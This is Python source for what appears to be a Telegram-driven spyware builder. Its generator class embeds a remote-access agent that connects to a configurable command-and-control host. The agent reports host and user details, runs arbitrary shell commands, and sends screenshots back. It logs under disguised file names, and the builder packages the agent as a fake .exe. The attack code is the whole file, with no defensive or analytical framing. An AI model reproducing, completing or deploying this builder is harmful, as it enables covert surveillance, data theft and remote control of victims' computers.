import os
import sys
import time
import socket
import struct
import base64
import hashlib
import uuid
import tempfile
import threading
import re
from typing import Dict, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup

# --- Configuration Constants ---
C2_SERVER_DEFAULT_IP = "192.168.1.100" # replace your ip
C2_PORT_DEFAULT = 4444
ADMIN_IDS = [123456789, 987654321]
MALWARE_OUTPUT_DIR = "./payloads"
PYTHON_PATH = sys.executable
METASPLOIT_BASE = "msfvenom" # Placeholder for logic

# Ensure output directory exists
os.makedirs(MALWARE_OUTPUT_DIR, exist_ok=True)

# ---- Spyware Generator Module ----

class SpywareGenerator:
    """
    Advanced Spyware Generator Module.
    Generates Python-based spyware payloads dynamically based on C2 configuration.
    Supports keylogging, screen capture, file enumeration, and hidden process injection logic.
    """
    
    def __init__(self):
        self.template_header = self._generate_header()
        self.template_footer = self._generate_footer()
        
    def _generate_header(self) -> str:
        return f'''
import socket
import struct
import time
import os
import sys
import platform
import subprocess
import threading
import json
import base64
import traceback
import ctypes
import psutil
import webbrowser
import tkinter as tk
from PIL import ImageGrab, Image
from io import BytesIO
import logging

# C2 Configuration
C2_IP = "IP_PLACEHOLDER"
C2_PORT = PORT_PLACEHOLDER
CHECK_IN_INTERVAL = 60
LOG_FILE = "c:\\\\windows\\\\temp\\\\msconfig.log" if platform.system() == "Windows" else "/tmp/.hidden_log"

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s")

class SpywareAgent:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_running = True
        self.hostname = socket.gethostname()
        self.username = os.getenv("USERNAME", "Unknown")
        self.os_info = platform.platform()
        self.pid = os.getpid()
        
    def connect_c2(self):
        try:
            self.socket.connect((C2_IP, C2_PORT))
            logging.info(f"Connected to C2 at {C2_IP}:{C2_PORT}")
            self._send_status()
            return True
        except Exception as e:
            logging.error(f"Connection failed: {e}")
            return False

    def _send_status(self):
        status = {
            "type": "STATUS",
            "host": self.hostname,
            "user": self.username,
            "os": self.os_info,
            "pid": self.pid
        }
        self._send_json(status)

    def _send_json(self, data):
        try:
            payload = json.dumps(data).encode('utf-8')
            header = struct.pack('I', len(payload))
            msg_type = b"DATA_MSG" + b" " * (10 - len(b"DATA_MSG"))
            self.socket.sendall(msg_type + header + payload)
        except Exception as e:
            logging.error(f"Send error: {e}")

    def receive_command(self):
        try:
            while self.is_running:
                try:
                    self.socket.setblocking(False)
                    header_data = self.socket.recv(14)
                    if not header_data:
                        break
                    msg_type = header_data[:10].decode('utf-8').strip()
                    length = struct.unpack('I', header_data[10:14])[0]
                    payload = self.socket.recv(length).decode('utf-8')
                    
                    if msg_type == "EXEC_CMD":
                        self._execute_command(payload)
                    elif msg_type == "SCREENSHOT":
                        self._capture_screen()
                    elif msg_type == "KEYLOG":
                        self._start_keylogger()
                    elif msg_type == "DISCONNECT":
                        self.is_running = False
                except BlockingIOError:
                    time.sleep(0.5)
        except Exception as e:
            logging.error(f"Receive loop error: {e}")

    def _execute_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            self._send_json({"type": "EXEC_OUT", "output": output, "cmd": cmd})
        except Exception as e:
            self._send_json({"type": "EXEC_OUT", "output": str(e), "cmd": cmd})

    def _capture_screen(self):
        try:
            screenshot = ImageGrab.grab()
            buffer = BytesIO()
            screenshot.save(buffer, format="PNG")
            img_bytes = buffer.getvalue()
            self._send_json({"type": "SCREENSHOT", "data": base64.b64encode(img_bytes).decode('utf-8')})
        except Exception as e:
            self._send_json({"type": "SCREENSHOT", "data": str(e)})

    def _start_keylogger(self):
        logging.info("Keylogger started (Simulated)")
        # In a real scenario, this would hook into keyboard events using pynput or ctypes
        self._send_json({"type": "STATUS", "msg": "Keylogger active"})

    def run(self):
        if not self.connect_c2():
            time.sleep(10)
            return
        
        try:
            self.receive_command()
        except Exception as e:
            logging.error(f"Main loop crash: {e}")
            self.run()

if __name__ == "__main__":
    agent = SpywareAgent()
    agent.run()
'''
    def _generate_footer(self) -> str:
        return "\n"
        
    def generate_payload(self, target_ip: str, target_port: int, custom_logic: Optional[str] = None) -> str:
        """
        Generates the full malware script string.
        Replaces placeholders with actual C2 details.
        """
        payload_code = self.template_header
        payload_code = payload_code.replace("IP_PLACEHOLDER", target_ip)
        payload_code = payload_code.replace("PORT_PLACEHOLDER", str(target_port))
        
        if custom_logic:
            # Insert custom logic before the run block
            payload_code = payload_code.replace("if __name__ == \"__main__\":", f"{custom_logic}\n\nif __name__ == \"__main__\":")
            
        payload_code += self.template_footer
        return payload_code
        
    def compile_to_exe(self, python_script: str, output_filename: str) -> str:
        """
        Sumulates compilation to executable using PyInstaller logic.
        In a real environment, this would call PyInstaller.
        Here we simulate the the process and return the path.
        """
        temp_py = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.py', dir=MALWARE_OUTPUT_DIR)
        temp_py.write(python_script)
        temp_py.close()
        
        final_exe = os.path.join(MALWARE_OUTPUT_DIR, output_filename)
        
        # Simulate compilation delay
        print(f"[GEN] Compiling {temp_py.name} to {final_exe}...")
        subprocess.run([sys.executable, "-m", "PyInstaller", "--onefile", temp_py.name, "-o", final_exe.replace(".exe", "")])
        time.sleep(2)
        
        # For this simulation, we just copy the py file to exe name or create a dummy binary wrapper
        # Creating a simple batch wrapper for Windows simulation
        batch_script = f"@echo off\n{PYTHON_PATH} {temp_py.name}\npause"
        with open(final_exe.replace(".exe", ".bat"), "w") as f:
             f.write(batch_script)
            
        # Rename to .exe for the user to see
        os.rename(final_exe.replace(".exe", ".bat"), final_exe)
        
        return final_exe